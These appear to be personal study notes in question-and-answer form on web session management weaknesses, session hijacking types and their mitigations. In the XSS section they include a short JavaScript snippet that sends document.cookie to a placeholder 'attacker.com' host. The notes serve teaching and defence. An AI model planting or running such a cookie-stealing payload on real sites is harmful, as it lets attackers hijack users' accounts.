- What is the common way to associate a user with a session?
    The user has a session token, usually a cookie (ex: AuthCookie).

- What are others way to transmit session token?
    Hidden form fields
    URL query string

- Why is session management necessary?
    Because the HTTP protocol is stateless. All of the transactions are independent.

- Do web applications that does not require login need session management?
    In some cases, yes. For example, a web application with a basket.

- What are the 2 categories of the vulnerabilities we can find in session management?
    Weaknesses in the generation of the session tokens
    Weaknesses in the handling of session tokens throughout their life cycle

- Name 1 alternative to session management and describe them
    HTTP authentication
        Like basic, digest, NTLM
        Client interacts with authentication mechanism directly via the browser, using HTTP headers
        The browser re-submit the credentials

- What is the common weaknesses in token generation? Describe them.
    Meaningful tokens
        Token display technology architecture (ex: ASPSessionId)
        Based om some user informations (ex: email) and then encoded or obfuscated.
        - Example?
            757365723d6461663b6170703d61646d696e3b646174653d30312f31322f3131
            is in fact en ASCII version of
            user=daf;app=admin;date=10/09/11
        Therefore it is guessable.
        It also disclose internal information (even the architecture) of the application
            Fist and last name
            email address
            IP address
            etc.
    Predictable tokens
        Identifiable pattern for the token generation
        - What are the sources of predictable tokens?
            Conceal sequences
                - Give an example.
                    Add an exadecimal value to the token value for each new token.
            Time dependency
                Do not use time as the input to generate the token (like as the seed), or even the time stamp directly
            Weak random number generation
                In a computer, evrything is pseudorandom, make sure an attacker cannot predict a sequence a token given a single valid token.
    Length
- How do you test for the quality of randomness in the session token?
    Sometime it is visually inspectable, or with little manual analysis
    Otherwhise, follow these steps:
        Start with the hypothesis that the tokens are randomly generated
        Apply series of tests, each of which observes specific properties of the sample that are likely to have certain characteristics if the tokens are random
        For each test, calculate the probability of the observed characteristics to occur
        If the probability falls below a certain level, the tokens ar enot randomly generated

- Is there a tool to automate the discovery of the randomness of a token?
    Yes, Burp Sequencer

- Is it safe to use encrypted user information to create the token?
    Not really, there has been cases where an attacker tampered with the token value, wihtout even decrypting it.

- What is the main problem with ECB (electronic codebook) ciphers?
    It takes a string of text and split it in equal size block, then encrypt each block with the same key. Patterns can be dicerned since blocks that have the same content will have the same encryption

    Even without this, it can be possible to leverage an attack. For example, if the application use this cipher to encrypt the suer information for the token, it would be possible to tamper with the data to change the user information (ex: elevate as admin, identify as another user, etc) even when the token is still encrypted

- How does CBC (cipher block chaining) ciphers solve the issue of ECB ciphers?
    It XOR each block with the previous block.

- With which tool could you try to defeat that cipher?
    Burp bit flipper

- It is impossible to capture the session token because SSL is used, true or false?
    False, attacks like XSS can capture the token.

- How could the session token be disclosed?
    MitM on unencrypted (HTTP) connection
    Even when HTTPS is used on authenticated session, sometime a session token is assigned at the home page which is served over HTTP, and is kept once the user is logged in.
        If the Session token is in the URL, an attacker could send a url to a victim with a crafted token, let the user logs in, and then the attacker only has to refresh the page with the same session token in order to hijack the user account
        Related: session donation (requires social engineering) : create an account for a victim with vitim's name, sned the url with the session id in the url, get information from user actions
    Load resources (ex: images) over HTTTP with the page in HTTPS, the token is still sent with the get requests for the resources

- What kind of weakness can be found regarding the mapping of the tokens to the sessions?
    Allow multiple valid tokens to be concurrently assigned to the same user account.
    Re-issue the same token to the user each time he logs in
    Does not disconnect previous session when a new session is created (either the previous session has expired or someone connected to the web app while a session was already opened. If an attacker connect to the account while the legetimate user is connected, the user will not be disconnected (and informed that someelse connected to his account))

- Why is session termination important?
    Reduce the time window of opportunity within an attacker may capture, guess or use a valid session token.
    Give the user a control over the security of his account: reduce the time window even further
    - What are the main weaknesses in sessions termination?
        Failling to fullfill the above points

- How could session termination be badly implemented?
    Logout not present
    Logout present, but only removes the token from the browser, the token is still valid
    Client-side code blanks the cookie

- What kind of restrictions can be set to a (session) cookie to improve its security?
    domain
    path
    http
    secure

- The domain of a cookie is set to myapp.com . Will the token be sent to internalapp.myapp.com?
    Yes

- The domain of a cookie is set to internalapp.myapp.com . Will the token be sent to myapp.com?
    No

- What makes a strong token?
    Large set of possible values
    Strong source of pseudorandomness
    Optional:
        Add a secret string, that is only known to the server (and is regenerated at reboot/at some regular time), to the token, and hash the whole thing
        Add entropy related to the request: ip address  of the sender, the time of the request, the user-agent header, hash the whole thing

- How do you protect the token during its lifecycle?
    Set the secure flag
    Do not transmit token in URL
    Implement logout functionnality
    Session expiration after a certain period of inactivity
    Concurrent login should be prevented
    Restrict domain and path attribute

- How do you implement session token when cookies are disbled?
    Use POST requests for all navigation and store the token in a hidden field of an html form

- What are per-page tokens?
    In addition to the session token, a token is generated each time a page of the application is reached. (Cookie or hidden form field). For each new request, the server compare the previous page token, if it does not match, the session is terminated.

- What should be logged/monitored/alerted regarding session-management?
    Monitor requests that contain invalid tokens
    Alert users when anomalous events occur relating to their session

-- Ethical hacking: session hijacking --

- What are the type of session hijacking?
    Application level
        Session ID sniffing
        Session fixation
            provides session id to the user
        Session donation
            Attacker contruct an account and provides it to the user
        Session ID brute force
    Network level
        Blind hijacking
        Session sniffing (TCP level)
        IP spoofing (TCP level)
        UDP hijacking

- What are the possible attack vectors?
    MitM
    Man in the browser (malware, browser add-ons)
    Brute forcing
    XSS
    Session ID leakage (ex: exposed log file)

- Where is the session state on the server?
    Usually in memory
    From a process only for that
    From a DB only for that

- What is the biggest down side of using the URL to send the token?
    The token will be sent in the referrer from an HTPP resource
    The token may be logged

- What are the bad sides of using a session token in a hidden form field?
    Every request needs to be a post
    The session ID is lost as soon you leave the website (no remmember me)
    Cannot secure embedded resources (ex: video on the page)
        Not an authenticated request...

- What kind of attacks can lead to session hijacking? How?
    XSS
        By grabbing the cookie and to send it to the attacker website
            ex:
            var img = document.createElement("img");
            img.src="http://attacker.com/?cookies="+document.cookie;
            document.body.appendChild(img);
    Exposed cookie based session id in logs
    Leaking URL persisted sessions in the referer
        The web app make a call to an external website, it sends the referer URL in the request
            ex: persistent/reflected XSS to add a malicious link
    Session sniffing
        Sniffing the network
            (HTTP proxy), wireless level, DNS hijacked and send trafic to the attacker server, router level, ASP level, etc.
    Session fixation
        The attacker gives the session ID to the user.
            ex: Session id in url, and the token does not change after login, victim follow the link, login, et voil√†!
            ex: XSS that set the session cookie that the attacker knows to be good.
    Brute forcing the session id
    Session donation
        Not session hijacking persay, but related.
        Create an account for the victim (with its name etc.)
        Send the URL that includes the session Id (or inject the cookie)
            The attacker needs to social engineer the victim to "force" him to take some actions

- Is network level session hijacking a big problem nowadays?
    Not really, this is a remnant of a bygone era

- What is TCP?
    The protocol over what HTTP/HTTPS works on
    - How does it work?
        3 way handshake
        client sends synchronize packet -> server answers synchronize-acknowledgement -> client answer acknowledge
        seq=0 ack=0                        seq=1 ack=0                                   seq=1 ack=1
        each paquet has a seq and ack attribute (unsigned int)
        next requests:
        seq=1 ack=1 byte=120               seq=121 ack=1
    - What is the attack vector?
        Predict the seq for new requests
    - How old is it?
        > 10 years

- What is blind TCP session hijacking?
    Attack cannot sniff the network, so he desynchronize the connection, send the predictable seq ack, and receive the response from the server

- MitM session sniffing, how does it works?
    The attacker re-routes the packets, by forging ICMP paquets so that it passes to the attacker machine

- What is IP spoofing? How does it work?
    A TCP session hijacking attack.
    Attacker determines ip address of trusted host, address is spoofed in source routed packet, connection is desynchronized

- What is UDP?
    A connectionless protocol: no handshaking, paquets are sent then forgotten, you never know that it reached the destination.

- What is the difference between TCP and UDP hijacking?
    No desynchronization needed, the attacker simply needs to forge a response and send it before the server, and maybe MitM to block the server response

- What is man in the browser attack?
    Attacker infects victim's browser with a trojan, trojan extracts data from the DOM (credentials, cookies, URLs, etc.)

- How can you mitigate the risk of session hijacking?
    Use strong session Ids.
        - What does it mean?
            Not enumerable
            Not guessable (at short time)
            No patterns
    Keep session ids out of the URL
    Do not reuse session ID for auth
        Unauthenticated user has a session id, the same session id should not be used for its authenticated session
    Always flag session id cookies as http only and secure only
    Use TLS
        mitigates: DNS poisoning (certificates), MitM, the referrer header is not sent
    Session expiration and session cookies
        Minimizing the window of risk
    Consider disabling sliding sessions
        At each request, the expiration is reseted
        20 minutes before session expiration
                20 minutes before session expiration
                            20 minutes before session expiration
                                                20 minutes before session expiration
    Encourage users to log out
    Re-authenticate before key actions

- What tool can you use to manipulate the session cookie?
    ZAP, Burp(, NetSparker)